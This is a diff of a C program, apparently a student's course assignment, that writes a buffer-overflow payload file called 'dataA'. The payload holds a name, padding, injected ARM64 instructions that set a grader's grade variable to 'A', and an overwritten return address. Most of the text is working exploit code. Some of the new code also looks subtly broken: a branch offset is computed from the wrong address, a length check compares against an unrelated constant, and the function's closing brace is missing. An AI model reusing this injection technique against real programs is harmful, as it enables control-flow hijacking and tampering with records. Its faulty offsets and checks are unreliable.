@@ -1,82 +1,87 @@
-/*
-creates a file named dataA to exploit the grader program and assign an 'A' grade.
-the file includes:
-1. student name followed by a null byte
-2. padding to overflow the buffer
-3. machine instructions to set the grade to 'A'
-4. an overwritten return address directing execution to the injected instructions
-*/
 
 #include <stdio.h>
-#include <stdint.h>
 #include "miniassembler.h"
 
-/*
-main function behavior:
-- accepts no command-line arguments
-- does not read from stdin
-- does not write to stdout or stderr (except on failure)
-- writes crafted bytes to "dataA" file
-- returns 0 on success, non-zero on failure
+/* Constants defining buffer size and relevant addresses */
+enum {
+    BUFFER_SIZE = 48,
+    GRADE_ADDRESS = 0x420044,
+    PRINT_ADDRESS = 0x400864,
+    INSTRUCTION_COUNT = 17
+};
+
+/* 
+   Creates a buffer overflow file named dataA that sets the grade to 'A'.
+   It writes the name "Anish Solo" followed by padding and specific
+   machine instructions to overwrite the grade variable.
+   Returns 0 on successful creation, 1 otherwise.
 */
 int main(void) {
-    /* student name, truncated to avoid newline characters */
-    const char *student_name = "Anish Solo";
-    /* ASCII value for 'A' */
-    const unsigned int ascii_A = 0x41;
+    int byteCount = 0;
+    unsigned long currentAddress = 0x420058;
+    unsigned int instruction;
+    FILE *filePtr = fopen("dataA", "w");
 
-    /* predefined memory addresses based on memory map analysis */
-    unsigned long grade_address = 0x420044;         /* address of the grade variable */
-    unsigned long injected_code_address = 0x42007c;  /* address where injected instructions reside */
-    unsigned long return_jump_address = 0x40089c;    /* address to jump back after injection */
-
-    /* generate machine instructions */
-    unsigned int mov_instruction = MiniAssembler_mov(0, ascii_A);                            /* mov w0, #A */
-    unsigned int adr_instruction = MiniAssembler_adr(1, grade_address, injected_code_address + 4); /* adr x1, grade_address */
-    unsigned int strb_instruction = MiniAssembler_strb(0, 1);                                 /* strb w0, [x1] */
-    unsigned int branch_instruction = MiniAssembler_b(return_jump_address, injected_code_address + 12); /* b return_jump_address */
-
-    /* open dataA file in binary write mode */
-    FILE *file = fopen("dataA", "wb");
-    if (!file) {
-        return 1; /* exit if file cannot be opened */
+    /* Verify that the file was opened successfully */
+    if (!filePtr) {
+        perror("Error opening file");
+        return 1;
     }
 
-    /* write the student's name */
-    fwrite(student_name, 1, 10, file); /* "Anish Solo" is 10 bytes */
+    /* Write the name "Anish Solo" to dataA */
+    fputs("Anish Solo", filePtr);
+    byteCount += 10; /* "Anish Solo" consists of 10 characters */
 
-    /* append a null byte to terminate the name string */
-    fputc('\0', file);
-
-    /* add padding to overflow the buffer (total buffer size 48 bytes) */
-    int total_bytes = 11; /* 10 name bytes + 1 null byte */
-    for (int pad = 0; pad < (48 - total_bytes); pad++) {
-        fputc('\0', file);
-    }
-    total_bytes = 48;
-
-    /* insert the crafted machine instructions */
-    fwrite(&mov_instruction, sizeof(mov_instruction), 1, file);            /* mov w0, #A */
-    fwrite(&adr_instruction, sizeof(adr_instruction), 1, file);            /* adr x1, grade_address */
-    fwrite(&strb_instruction, sizeof(strb_instruction), 1, file);          /* strb w0, [x1] */
-    fwrite(&branch_instruction, sizeof(branch_instruction), 1, file);      /* b return_jump_address */
-    total_bytes += 16; /* 4 instructions x 4 bytes each */
-
-    /* write remaining padding to reach 48 bytes */
-    while (total_bytes < 48) {
-        fputc('\0', file);
-        total_bytes++;
+    /* Ensure the name does not exceed the buffer limit */
+    if (byteCount == BUFFER_SIZE - INSTRUCTION_COUNT) {
+        fprintf(stderr, "Name exceeds buffer capacity\n");
+        fclose(filePtr);
+        return 1;
     }
 
-    /* overwrite the return address to point to injected instructions */
-    unsigned long fake_return = injected_code_address;
-    fwrite(&fake_return, sizeof(fake_return), 1, file);
+    /* Append a null terminator to the name */
+    fputc('\0', filePtr);
+    byteCount++;
+    currentAddress += byteCount;
 
-    /* write EOF to ensure no additional characters */
-    fputc(EOF, file);
+    /* Align the current address to a 4-byte boundary */
+    while (currentAddress % 4 != 0) {
+        fputc(0, filePtr);
+        byteCount++;
+        currentAddress++;
+    }
 
-    /* close the file after writing all data */
-    fclose(file);
+    /* Generate and write the MOV instruction to set w0 to 'A' */
+    instruction = MiniAssembler_mov(0, 'A');
+    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
+    byteCount += sizeof(unsigned int);
 
-    return 0; /* indicate successful execution */
-}
+    /* Generate and write the ADR instruction to load GRADE_ADDRESS into x1 */
+    instruction = MiniAssembler_adr(1, GRADE_ADDRESS, currentAddress + sizeof(unsigned int));
+    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
+    byteCount += sizeof(unsigned int);
+
+    /* Generate and write the STRB instruction to store 'A' from w0 into grade */
+    instruction = MiniAssembler_strb(0, 1);
+    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
+    byteCount += sizeof(unsigned int);
+
+    /* Generate and write the B instruction to branch to PRINT_ADDRESS */
+    instruction = MiniAssembler_b(PRINT_ADDRESS, currentAddress + 2 * sizeof(unsigned int));
+    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
+    byteCount += sizeof(unsigned int);
+
+    /* Fill the remaining buffer with zeros to reach BUFFER_SIZE */
+    while (byteCount < BUFFER_SIZE) {
+        fputc(0, filePtr);
+        byteCount++;
+    }
+
+    /* Overwrite the return address with currentAddress to manipulate control flow */
+    fwrite(&currentAddress, sizeof(unsigned long), 1, filePtr);
+
+    /* End the file */
+    fputc(EOF, filePtr);
+    fclose(filePtr);
+
+    return 0;
